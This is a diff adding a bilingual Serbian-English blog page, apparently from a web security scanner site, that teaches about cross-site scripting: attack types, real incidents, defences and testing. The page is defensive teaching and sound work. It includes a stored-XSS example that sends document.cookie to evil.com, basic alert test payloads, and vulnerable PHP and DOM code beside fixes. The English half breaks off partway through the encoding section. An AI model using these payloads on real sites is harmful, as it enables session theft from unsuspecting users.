@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="sr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Napadi — Sta su i kako se zastititi | Web Security Scanner</title>
+  <meta name="description" content="Kompletni vodic za Cross-Site Scripting (XSS) napade: tipovi, realni primeri, posledice i detaljne mere zastite.">
+  <meta name="keywords" content="XSS, Cross-Site Scripting, bezbednost, web napadi, sanitizacija, CSP, DOMPurify, OWASP">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+  <link rel="canonical" href="https://security-scanner-ruddy.vercel.app/blog-security-xss.html">
+  <link rel="alternate" hreflang="sr" href="https://security-scanner-ruddy.vercel.app/blog-security-xss.html">
+  <link rel="alternate" hreflang="en" href="https://security-scanner-ruddy.vercel.app/blog-security-xss.html">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="XSS Napadi — Sta su i kako se zastititi od Cross-Site Scripting-a">
+  <meta property="og:description" content="Naucite sve o XSS napadima: 3 tipa, realni primeri i kako da zastitite vas sajt.">
+  <meta property="og:url" content="https://security-scanner-ruddy.vercel.app/blog-security-xss.html">
+  <meta property="og:site_name" content="Web Security Scanner">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="XSS Napadi — Sta su i kako se zastititi od Cross-Site Scripting-a">
+  <meta name="twitter:description" content="Naucite sve o XSS napadima: 3 tipa, realni primeri i kako da zastitite vas sajt.">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "XSS Napadi — Sta su i kako se zastititi",
+    "author": {"@type": "Person", "name": "Toske", "url": "https://toske-programer.web.app"},
+    "publisher": {"@type": "Organization", "name": "Web Security Scanner"},
+    "datePublished": "2026-04-09",
+    "dateModified": "2026-04-09",
+    "description": "Kompletni vodic za Cross-Site Scripting (XSS) napade: tipovi, realni primeri, posledice i detaljne mere zastite.",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https://security-scanner-ruddy.vercel.app/blog-security-xss.html"
+    }
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "Sta je XSS napad?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "XSS (Cross-Site Scripting) je tip web napada gde napadac ubacuje maliciozan JavaScript kod u stranicu koju drugi korisnici gledaju. Kod se izvrsava u browser-u zrtve sa svim privilegijama te stranice."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Koji je najcesci tip XSS-a?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Reflected XSS je najcesci tip — payload se salje kroz URL parametar i server ga vraca u odgovoru bez filtriranja. Stored XSS je najopasniji jer se cuva u bazi i pogadja sve posetioce."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Da li CSP stiti od XSS-a?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Da, Content Security Policy (CSP) je jedan od najefektivnijih mehanizama zastite. Sa nonce-based pristupom, cak i ako napadac ubaci kod, browser ga nece izvrsiti jer nema validan nonce."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Kako testirati sajt na XSS ranjivosti?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Koristite alate kao sto su OWASP ZAP, Burp Suite, ili XSS Hunter. Testirajte sva input polja sa test payloadima. Proverite i URL parametre, kolacice i HTTP header-e."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Da li framework-ovi stite od XSS-a?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Da, React, Angular, Vue i Django imaju automatski output encoding. Medjutim, svaki ima nesigurne escape-hatch metode (v-html, |safe) koje treba izbegavati."
+        }
+      }
+    ]
+  }
+  </script>
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "HowTo",
+    "name": "Kako zastititi sajt od XSS-a",
+    "step": [
+      {"@type": "HowToStep", "name": "Output encoding", "text": "Enkodujte korisnicke podatke pre prikazivanja u HTML-u."},
+      {"@type": "HowToStep", "name": "CSP header", "text": "Postavite Content-Security-Policy sa nonce pristupom."},
+      {"@type": "HowToStep", "name": "HttpOnly kolacici", "text": "Postavite HttpOnly flag na sesijske kolacice."},
+      {"@type": "HowToStep", "name": "Input validacija", "text": "Koristite whitelist pristup za validaciju korisnickog unosa."},
+      {"@type": "HowToStep", "name": "Sanitizacija", "text": "Koristite DOMPurify za HTML sadrzaj koji mora da sadrzi markup."}
+    ]
+  }
+  </script>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236c63ff' stroke-width='2.5' stroke-linecap='round'><path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/></svg>">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="./blog-common.css">
+</head>
+<body>
+<div class="blog-layout">
+  <aside class="timeline-nav">
+    <div class="sr">
+      <div class="timeline-title">Sadrzaj</div>
+      <ol id="timeline-sr"></ol>
+    </div>
+    <div class="en">
+      <div class="timeline-title">Contents</div>
+      <ol id="timeline-en"></ol>
+    </div>
+  </aside>
+  <main class="blog-content">
+
+  <!-- ==================== SRPSKI ==================== -->
+  <div class="sr">
+    <h1>XSS Napadi &mdash; Sta su i kako se zastititi</h1>
+    <p class="subtitle">Kompletni vodic za Cross-Site Scripting: tipovi napada, realni primeri i detaljne mere zastite</p>
+
+    <div class="stat-grid">
+      <div class="stat-card"><div class="stat-num">#7</div><div class="stat-label">OWASP Top 10 (2021)</div></div>
+      <div class="stat-card"><div class="stat-num">40%</div><div class="stat-label">Svih web ranjivosti</div></div>
+      <div class="stat-card"><div class="stat-num">380K</div><div class="stat-label">Ukradenih kartica (BA 2018)</div></div>
+      <div class="stat-card"><div class="stat-num">1M+</div><div class="stat-label">Zarazenih profila (Samy 2005)</div></div>
+    </div>
+
+    <div class="toc">
+      <h3>Sadrzaj</h3>
+      <ol>
+        <li><a href="#xss1">Sta je XSS</a></li>
+        <li><a href="#xss2">3 tipa XSS napada</a></li>
+        <li><a href="#xss3">Kako XSS radi</a></li>
+        <li><a href="#xss4">Realni primeri napada</a></li>
+        <li><a href="#xss5">Posledice XSS napada</a></li>
+        <li><a href="#xss6">Zastita: Output Encoding</a></li>
+        <li><a href="#xss7">Zastita: Content Security Policy</a></li>
+        <li><a href="#xss8">Zastita: HttpOnly kolacici</a></li>
+        <li><a href="#xss9">Zastita: Validacija i sanitizacija</a></li>
+        <li><a href="#xss10">Kako testirati XSS</a></li>
+        <li><a href="#xss11">Reference i resursi</a></li>
+      </ol>
+    </div>
+
+    <h2 id="xss1">1. Sta je XSS (Cross-Site Scripting)</h2>
+    <p>Cross-Site Scripting (XSS) je tip web ranjivosti gde napadac uspeva da ubaci maliciozan JavaScript kod u web stranicu koju drugi korisnici gledaju. Kod se izvrsava u browser-u zrtve sa svim privilegijama koje ta stranica ima.</p>
+    <p>XSS je klasifikovan kao <a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79</a> i nalazi se na OWASP Top 10 listi od njenog nastanka. U OWASP Top 10 2021, XSS je pod kategorijom <strong>A07:2021 &mdash; Cross-Site Scripting</strong>. U prethodnom izdanju (2017) bio je na poziciji <strong>#3 (A7:2017)</strong>, sto pokazuje koliko je rasprostranjen.</p>
+    <p>Prema HackerOne izvestaju, XSS predstavlja oko 18% svih prijavljenih ranjivosti na bug bounty platformama.</p>
+    <div class="callout callout-danger"><strong>Zasto XSS a ne CSS?</strong> Akronim CSS je vec zauzet za Cascading Style Sheets, pa se Cross-Site Scripting skracuje kao XSS.</div>
+
+    <h2 id="xss2">2. Tri tipa XSS napada</h2>
+
+    <h3>Tip 1: Reflected XSS (Non-Persistent)</h3>
+    <p>Najcesci tip. Payload se salje kroz URL parametar, server ga ukljuci u odgovor bez filtriranja. Zrtva mora kliknuti na pripremljeni link. Cesto se koristi u phishing kampanjama.</p>
+    <pre><code>&lt;!-- Ranjiv PHP kod --&gt;
+&lt;p&gt;Rezultati za: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;
+
+&lt;!-- Bezbedan kod --&gt;
+&lt;p&gt;Rezultati za: &lt;?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?&gt;&lt;/p&gt;</code></pre>
+
+    <h3>Tip 2: Stored XSS (Persistent)</h3>
+    <p>Najopasniji tip. Maliciozan kod se cuva u bazi podataka i prikazuje svim korisnicima koji posete stranicu. Cest u komentarima, forumskim postovima i korisnickim profilima. Ne zahteva interakciju od zrtve &mdash; sama poseta stranici je dovoljna.</p>
+    <pre><code>&lt;!-- Napadac ostavlja komentar: --&gt;
+Odlican clanak! &lt;script&gt;
+  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
+&lt;/script&gt;
+
+&lt;!-- Svaki posetilac te stranice nesvesno salje kolacice napadacu --&gt;</code></pre>
+
+    <h3>Tip 3: DOM-based XSS</h3>
+    <p>Kod se nikada ne salje serveru. JavaScript na stranici koristi nesigurne DOM API-je za obradu korisnickog unosa bez sanitizacije. Server ne vidi napad jer se sve desava u browser-u.</p>
+    <pre><code>// RANJIVO &mdash; nesiguran DOM metod ubacuje korisnicki HTML
+var name = new URLSearchParams(location.search).get('name');
+document.getElementById('g').insertAdjacentHTML('beforeend', name);
+
+// BEZBEDNO &mdash; textContent enkoduje automatski
+document.getElementById('g').textContent = name;</code></pre>
+
+    <h3>Poredjenje tipova</h3>
+    <table>
+      <tr><th>Karakteristika</th><th>Reflected</th><th>Stored</th><th>DOM-based</th></tr>
+      <tr><td>Persistencija</td><td>Jednokratno</td><td>Trajno (u bazi)</td><td>Jednokratno</td></tr>
+      <tr><td>Vektor</td><td>URL parametar</td><td>Baza podataka</td><td>JavaScript/DOM</td></tr>
+      <tr><td>Izvrsavanje</td><td>Server + browser</td><td>Server + browser</td><td>Samo browser</td></tr>
+      <tr><td>Interakcija zrtve</td><td>Klik na link</td><td>Samo poseta stranici</td><td>Klik na link</td></tr>
+      <tr><td>Vidljivost serveru</td><td>Da (u logu)</td><td>Da (u bazi)</td><td>Ne</td></tr>
+      <tr><td>Opasnost</td><td>Srednja</td><td>Visoka</td><td>Srednja</td></tr>
+    </table>
+
+    <h2 id="xss3">3. Kako XSS napad radi &mdash; korak po korak</h2>
+    <ol>
+      <li><strong>Identifikacija</strong> &mdash; Napadac pronalazi input polje ili URL parametar bez filtriranja.</li>
+      <li><strong>Kreiranje payload-a</strong> &mdash; Pravi JavaScript kod prilagodjen kontekstu (HTML, atribut, JS).</li>
+      <li><strong>Ubacivanje</strong> &mdash; Payload se unosi kroz formu, URL, ili API poziv.</li>
+      <li><strong>Isporuka</strong> &mdash; Server vraca zarazeni HTML korisnicima (ili browser sam obradjuje za DOM-based).</li>
+      <li><strong>Izvrsavanje</strong> &mdash; Browser zrtve izvrsava maliciozan kod sa privilegijama stranice.</li>
+      <li><strong>Eksfiltracija</strong> &mdash; Ukradeni podaci (kolacici, tokeni, lozinke) se salju napadacu.</li>
+    </ol>
+    <div class="callout callout-danger"><strong>Primer eksfiltracije:</strong> Napadac ubacuje nevidljivu sliku ciji URL sadrzi kolacice zrtve. Browser ucitava "sliku" i salje kolacice na napadacev server. Sve se desava nevidljivo za korisnika.</div>
+
+    <h2 id="xss4">4. Realni primeri napada</h2>
+
+    <h3>Samy Worm &mdash; MySpace (2005)</h3>
+    <p>Samy Kamkar kreirao XSS crv koji se automatski dodavao kao friend i kopirao u profil zrtve. Za samo 20 sati zarazeno je preko 1 milion korisnika &mdash; najbrze sireci virus ikada. MySpace je morao da ugasi ceo sajt da bi ocistio infekciju. Samy je dobio 3 godine uslovno i 90 dana drustvenog rada.</p>
+    <p class="ref"><a href="https://samy.pl/myspace/" target="_blank">samy.pl/myspace &mdash; Originalni write-up</a></p>
+
+    <h3>British Airways &mdash; Magecart (2018)</h3>
+    <p>Grupa Magecart ubacila maliciozan JavaScript u BA sajt i mobilnu aplikaciju. Skripta je presretala podatke sa forme za placanje: ime, adresa, broj kartice i CVV. Napad je trajao od 21. avgusta do 5. septembra 2018, pogodivsi ~380,000 transakcija. ICO je izrekao kaznu od <strong>20 miliona funti</strong> po GDPR-u.</p>
+
+    <h3>Fortnite &mdash; XSS u login stranici (2019)</h3>
+    <p>Istrazivaci iz Check Point-a otkrili su XSS ranjivost na starom, zaboravljenom Epic Games poddomenu. Napadac je mogao da ukrade pristupni token korisnika bez da zna lozinku &mdash; dovoljno je bilo da zrtva klikne na link. Sa 200+ miliona igraca u to vreme, potencijalni uticaj bio je ogroman. Epic Games je brzo zakrpio ranjivost nakon prijave.</p>
+
+    <h3>eBay XSS (2015&ndash;2016)</h3>
+    <p>Prodavci su mogli da ubacuju JavaScript u opise proizvoda. Stored XSS je omogucavao preusmeravanje kupaca na phishing sajtove ili kradju sesije. Problem je bio posebno opasan jer je eBay dozvoljavao HTML u opisima.</p>
+
+    <h3>jQuery &mdash; CVE-2020-11022</h3>
+    <p>XSS ranjivost u jQuery verzijama 1.2 do 3.5.0. Metoda <code>.html()</code> bila je ranjiva kad se koristila sa nepouzdanim HTML-om. S obzirom da jQuery koristi 77%+ sajtova (W3Techs), ovo je pogodilo ogroman broj aplikacija. Fix: upgrade na 3.5.1+.</p>
+    <p class="ref"><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11022" target="_blank">CVE-2020-11022 &mdash; NVD</a></p>
+
+    <h3>jQuery UI &mdash; CVE-2021-41184</h3>
+    <p>Datepicker widget bio je ranjiv na XSS kroz <code>altField</code> opciju. Fiksovano u verziji 1.13.0.</p>
+    <p class="ref"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41184" target="_blank">CVE-2021-41184 &mdash; NVD</a></p>
+
+    <h2 id="xss5">5. Posledice XSS napada</h2>
+    <ul>
+      <li><strong>Kradja sesije</strong> &mdash; Napadac preuzima nalog zrtve citajuci <code>document.cookie</code></li>
+      <li><strong>Phishing</strong> &mdash; Lazni login form prikazan preko legitimnog sajta</li>
+      <li><strong>Defacement</strong> &mdash; Promena izgleda sajta, unistavanja reputacije</li>
+      <li><strong>Preusmeravanje</strong> &mdash; Korisnik se salje na maliciozne sajtove bez znanja</li>
+      <li><strong>Keylogging</strong> &mdash; Snimanje svih tastera koje korisnik pritisne na stranici</li>
+      <li><strong>Kradja kartica</strong> &mdash; Presretanje podataka sa formi za placanje (Magecart tehnika)</li>
+      <li><strong>Malware distribucija</strong> &mdash; Automatsko preuzimanje malvera na racunar zrtve</li>
+      <li><strong>Cryptojacking</strong> &mdash; Rudarenje kriptovaluta u browser-u zrtve</li>
+      <li><strong>GDPR kazne</strong> &mdash; Kompanija koja ne zastiti korisnike moze dobiti kaznu do 4% globalnog prometa</li>
+    </ul>
+
+    <h2 id="xss6">6. Zastita: Output Encoding</h2>
+    <p>Najvaznija mera zastite &mdash; konvertovanje specijalnih karaktera u bezbedne ekvivalente pre prikazivanja korisnickih podataka.</p>
+    <h3>HTML kontekst</h3>
+    <pre><code>// BEZBEDNO &mdash; textContent ne parsira HTML
+element.textContent = userInput;
+
+// Rucno HTML enkodovanje
+function htmlEncode(str) {
+  return str.replace(/&amp;/g, '&amp;amp;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/"/g, '&amp;quot;')
+            .replace(/'/g, '&amp;#x27;');
+}
+
+// PHP
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+// Django &mdash; automatski enkoduje u template-ima
+{{ user_input }}</code></pre>
+    <h3>JavaScript kontekst</h3>
+    <pre><code>// BEZBEDNO &mdash; data atributi umesto inline JS
+var name = document.getElementById('user').dataset.name;
+
+// NIKAD nemojte ovo:
+// var name = '{{ user_input }}';  &lt;-- XSS ako input sadrzi '</code></pre>
+    <h3>URL kontekst</h3>
+    <pre><code>// Uvek koristite encodeURIComponent za parametre
+var url = '/profil?name=' + encodeURIComponent(userInput);</code></pre>
+    <p class="ref"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></p>
+
+    <h2 id="xss7">7. Zastita: Content Security Policy (CSP)</h2>
+    <p>CSP ogranicava koje skripte browser sme da izvrsi. Cak i ako napadac ubaci kod, CSP ga blokira jer nema dozvolu za izvrsavanje.</p>
+    <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-R4nd0m123';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  object-src 'none';
+  base-uri 'self';
+  form-action 'self';</code></pre>
+    <h3>Nonce-based pristup</h3>
+    <p>Server generise random nonce za svaki zahtev. Samo skripte sa tacnim nonce atributom se izvrsavaju. Ovo je preporuceni pristup po CSP Level 3.</p>
+    <pre><code>&lt;!-- Sa nonce-om &mdash; browser izvrsava --&gt;
+&lt;script nonce="R4nd0m123"&gt;console.log('Ova skripta radi');&lt;/script&gt;
+
+&lt;!-- Bez nonce-a &mdash; browser BLOKIRA --&gt;
+&lt;script&gt;alert('Ova skripta je blokirana');&lt;/script&gt;</code></pre>
+    <div class="callout"><strong>strict-dynamic:</strong> CSP 3 direktiva <code>'strict-dynamic'</code> dozvoljava nonce skriptama da ucitavaju dodatne skripte bez eksplicitnog nonce-a.</div>
+    <p class="ref"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN &mdash; CSP</a> | <a href="/blog-security-headers.html">Security Headers vodic</a></p>
+
+    <h2 id="xss8">8. Zastita: HttpOnly kolacici</h2>
+    <p>HttpOnly flag sprecava JavaScript pristup kolacicima &mdash; <code>document.cookie</code> nece vratiti HttpOnly kolacice. Cak i ako XSS uspe, napadac ne moze da ukrade sesiju.</p>
+    <pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
+
+// PHP
+session_set_cookie_params([
+    'httponly' =&gt; true,
+    'secure' =&gt; true,
+    'samesite' =&gt; 'Strict'
+]);
+
+// Express.js
+app.use(session({
+  cookie: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 3600000 }
+}));
+
+// Django settings.py
+SESSION_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SECURE = True
+SESSION_COOKIE_SAMESITE = 'Strict'
+CSRF_COOKIE_HTTPONLY = True</code></pre>
+    <h3>SameSite atribut</h3>
+    <ul>
+      <li><code>Strict</code> &mdash; Kolacic se salje samo za zahteve sa istog sajta (najbezbednije)</li>
+      <li><code>Lax</code> &mdash; Salje se za navigacione GET zahteve sa drugih sajtova (browser default od 2020)</li>
+      <li><code>None; Secure</code> &mdash; Uvek se salje, ali zahteva HTTPS (za cross-site integracije)</li>
+    </ul>
+
+    <h2 id="xss9">9. Zastita: Input validacija i sanitizacija</h2>
+    <h3>Whitelist pristup (preporucen)</h3>
+    <pre><code>function validateUsername(input) {
+  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
+}
+function validateEmail(input) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
+}</code></pre>
+    <h3>DOMPurify &mdash; sanitizacija HTML-a</h3>
+    <pre><code>import DOMPurify from 'dompurify';
+
+// Osnovna sanitizacija
+var clean = DOMPurify.sanitize(dirtyHTML);
+
+// Sa whitelist-om
+var clean = DOMPurify.sanitize(dirtyHTML, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
+  ALLOWED_ATTR: ['href', 'title', 'target']
+});
+
+// Python &mdash; bleach biblioteka
+import bleach
+clean = bleach.clean(dirty, tags=['b', 'i', 'a'], attributes={'a': ['href']})</code></pre>
+    <h3>Framework zastite</h3>
+    <table>
+      <tr><th>Framework</th><th>Auto-escaping</th><th>Opasne funkcije (izbegavajte!)</th></tr>
+      <tr><td>React</td><td>Da (JSX enkoduje)</td><td>Unsafe innerHTML wrapper metod</td></tr>
+      <tr><td>Angular</td><td>Da (templates)</td><td>bypassSecurityTrust metode</td></tr>
+      <tr><td>Vue.js</td><td>Da ({{ }})</td><td><code>v-html</code> direktiva</td></tr>
+      <tr><td>Django</td><td>Da (templates)</td><td><code>|safe</code> filter, <code>mark_safe()</code></td></tr>
+      <tr><td>Laravel/Blade</td><td>Da ({{ }})</td><td><code>{!! !!}</code> sintaksa</td></tr>
+      <tr><td>ASP.NET Razor</td><td>Da (@)</td><td><code>@Html.Raw()</code></td></tr>
+    </table>
+    <div class="callout callout-warn"><strong>Defense in Depth:</strong> Kombinujte output encoding + CSP + HttpOnly kolacice + input validaciju + sanitizaciju za kompletnu zastitu. Nijedan mehanizam sam nije dovoljan.</div>
+
+    <h2 id="xss10">10. Kako testirati sajt na XSS</h2>
+    <p>Testiranje za XSS je kritican deo bezbednosnog audita.</p>
+    <h3>Automatski alati</h3>
+    <ul>
+      <li><strong>OWASP ZAP</strong> &mdash; Besplatan, open-source proxy sa XSS skenerom</li>
+      <li><strong>Burp Suite</strong> &mdash; Profesionalni alat sa naprednim XSS detekcijom (Community verzija je besplatna)</li>
+      <li><strong>XSS Hunter</strong> &mdash; Specializovan za otkrivanje blind XSS ranjivosti</li>
+      <li><strong>Nuclei</strong> &mdash; Template-based skener sa XSS proverama</li>
+    </ul>
+    <h3>Manuelno testiranje</h3>
+    <pre><code>&lt;!-- Osnovni test payloadi --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+
+&lt;!-- Testirati u: --&gt;
+&lt;!-- 1. Sva input polja (pretraga, komentari, profil) --&gt;
+&lt;!-- 2. URL parametri (?q=, ?name=, ?redirect=) --&gt;
+&lt;!-- 3. HTTP headeri (Referer, User-Agent) --&gt;
+&lt;!-- 4. Kolacici --&gt;
+&lt;!-- 5. File upload imena --&gt;</code></pre>
+    <h3>Browser DevTools</h3>
+    <ul>
+      <li>Console tab &mdash; pratite CSP greske i blokirane skripte</li>
+      <li>Network tab &mdash; proverite da li se <code>Content-Security-Policy</code> header salje</li>
+      <li>Application tab &mdash; proverite da li kolacici imaju <code>HttpOnly</code> flag</li>
+    </ul>
+    <div class="callout"><strong>Web Security Scanner:</strong> Nas alat automatski proverava CSP header, HttpOnly kolacice i druge bezbednosne konfiguracije vaseg sajta.</div>
+
+    <h2 id="xss11">11. Reference i resursi</h2>
+    <ul>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></li>
+      <li><a href="https://owasp.org/Top10/A07_2021-Cross-Site_Scripting_(XSS)/" target="_blank">OWASP Top 10 &mdash; A07:2021 Cross-Site Scripting</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79: Improper Neutralization of Input</a></li>
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger &mdash; XSS Labs (besplatne vezbe)</a></li>
+      <li><a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify &mdash; DOM-only XSS sanitizer</a></li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN &mdash; Content Security Policy (CSP)</a></li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11022" target="_blank">CVE-2020-11022 &mdash; jQuery XSS</a></li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41184" target="_blank">CVE-2021-41184 &mdash; jQuery UI Datepicker XSS</a></li>
+      <li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
+    </ul>
+    <a href="./index.html" class="cta">Skenirajte vas sajt na XSS ranjivosti &rarr;</a>
+  </div>
+
+  <!-- ==================== ENGLISH ==================== -->
+  <div class="en">
+    <h1>XSS Attacks &mdash; What they are and how to protect yourself</h1>
+    <p class="subtitle">Complete guide to Cross-Site Scripting: attack types, real-world examples, and detailed protection measures</p>
+
+    <div class="stat-grid">
+      <div class="stat-card"><div class="stat-num">#7</div><div class="stat-label">OWASP Top 10 (2021)</div></div>
+      <div class="stat-card"><div class="stat-num">40%</div><div class="stat-label">Of all web vulnerabilities</div></div>
+      <div class="stat-card"><div class="stat-num">380K</div><div class="stat-label">Cards stolen (BA 2018)</div></div>
+      <div class="stat-card"><div class="stat-num">1M+</div><div class="stat-label">Infected profiles (Samy 2005)</div></div>
+    </div>
+
+    <div class="toc">
+      <h3>Table of Contents</h3>
+      <ol>
+        <li><a href="#xss1">What is XSS</a></li>
+        <li><a href="#xss2">3 types of XSS</a></li>
+        <li><a href="#xss3">How XSS works</a></li>
+        <li><a href="#xss4">Real-world examples</a></li>
+        <li><a href="#xss5">Consequences</a></li>
+        <li><a href="#xss6">Output Encoding</a></li>
+        <li><a href="#xss7">Content Security Policy</a></li>
+        <li><a href="#xss8">HttpOnly cookies</a></li>
+        <li><a href="#xss9">Validation and sanitization</a></li>
+        <li><a href="#xss10">Testing for XSS</a></li>
+        <li><a href="#xss11">References</a></li>
+      </ol>
+    </div>
+
+    <h2 id="xss-e1">1. What is XSS (Cross-Site Scripting)</h2>
+    <p>Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious JavaScript into a page viewed by other users. Classified as <a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79</a>. OWASP Top 10 2021: <strong>A07:2021</strong> (previously <strong>#3 in A7:2017</strong>). About 18% of bug bounty reports (HackerOne).</p>
+
+    <h2 id="xss-e2">2. Three types of XSS attacks</h2>
+    <h3>Type 1: Reflected XSS (Non-Persistent)</h3>
+    <p>Most common. Payload sent via URL, server includes it in response without filtering. Victim must click crafted link.</p>
+    <pre><code>&lt;!-- Vulnerable (PHP) --&gt;
+&lt;?php echo $_GET['q']; ?&gt;
+
+&lt;!-- Secure --&gt;
+&lt;?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?&gt;</code></pre>
+    <h3>Type 2: Stored XSS (Persistent)</h3>
+    <p>Most dangerous. Code stored in database, displayed to all visitors. Common in comments, forums, profiles. No interaction needed.</p>
+    <h3>Type 3: DOM-based XSS</h3>
+    <p>Never sent to server. JavaScript uses unsafe DOM APIs with user input.</p>
+    <pre><code>// VULNERABLE &mdash; unsafe DOM method inserts user HTML
+element.insertAdjacentHTML('beforeend', userInput);
+
+// SAFE &mdash; textContent auto-encodes
+element.textContent = userInput;</code></pre>
+    <table>
+      <tr><th>Feature</th><th>Reflected</th><th>Stored</th><th>DOM-based</th></tr>
+      <tr><td>Persistence</td><td>One-time</td><td>Permanent</td><td>One-time</td></tr>
+      <tr><td>Execution</td><td>Server+browser</td><td>Server+browser</td><td>Browser only</td></tr>
+      <tr><td>Danger</td><td>Medium</td><td>High</td><td>Medium</td></tr>
+    </table>
+
+    <h2 id="xss-e3">3. How XSS works &mdash; step by step</h2>
+    <ol>
+      <li><strong>Find vulnerability</strong> &mdash; Unfiltered input field</li>
+      <li><strong>Inject payload</strong> &mdash; Malicious JS stored in database</li>
+      <li><strong>Deliver to victim</strong> &mdash; Server sends infected HTML</li>
+      <li><strong>Browser executes</strong> &mdash; JS runs with page privileges</li>
+      <li><strong>Data exfiltration</strong> &mdash; Stolen data sent to attacker</li>
+    </ol>
+
+    <h2 id="xss-e4">4. Real-world examples</h2>
+    <h3>Samy Worm &mdash; MySpace (2005)</h3>
+    <p>XSS worm infected 1M+ users in 20 hours. Fastest-spreading virus ever. <a href="https://samy.pl/myspace/" target="_blank">Details</a></p>
+    <h3>British Airways &mdash; Magecart (2018)</h3>
+    <p>Malicious JS intercepted payment data from 380,000 transactions. &pound;20M fine by ICO for GDPR violations.</p>
+    <h3>Fortnite &mdash; Login page XSS (2019)</h3>
+    <p>Check Point researchers found XSS on a forgotten Epic Games subdomain. Could steal access tokens from 200M+ players. Patched quickly after disclosure.</p>
+    <h3>jQuery &mdash; CVE-2020-11022</h3>
+    <p>XSS in jQuery 1.2&ndash;3.5.0 via <code>.html()</code>. 77% of websites affected. Fix: upgrade to 3.5.1+.</p>
+    <h3>jQuery UI &mdash; CVE-2021-41184</h3>
+    <p>Datepicker XSS via <code>altField</code>. Fixed in 1.13.0.</p>
+
+    <h2 id="xss-e5">5. Consequences</h2>
+    <ul>
+      <li><strong>Session hijacking</strong> &mdash; Steal session cookies via <code>document.cookie</code></li>
+      <li><strong>Phishing</strong> &mdash; Fake login forms on legitimate domains</li>
+      <li><strong>Defacement</strong> &mdash; Alter page content</li>
+      <li><strong>Redirection</strong> &mdash; Send users to malicious sites</li>
+      <li><strong>Keylogging</strong> &mdash; Record keystrokes</li>
+      <li><strong>Card theft</strong> &mdash; Intercept payment data (Magecart)</li>
+      <li><strong>Malware</strong> &mdash; Drive-by downloads</li>
+      <li><strong>Cryptojacking</strong> &mdash; Mine cryptocurrency in victim's browser</li>
+      <li><strong>GDPR fines</strong> &mdash; Up to 4% of global revenue</li>
+    </ul>
+
+    <h2 id="xss-e6">6. Protection: Output Encoding</h2>
+    <pre><code>// Safe &mdash; textContent
+element.textContent = userInput;
+
+// HTML encoding
+function htmlEncode(s) {
+  return s.replace(/&amp;/g,'&amp;amp;').replace(/&lt;/g,'&amp;lt;')
+          .replace(/&gt;/g,'&amp;gt;').replace(/"/g,'&amp;quot;');
+}
+
+// PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
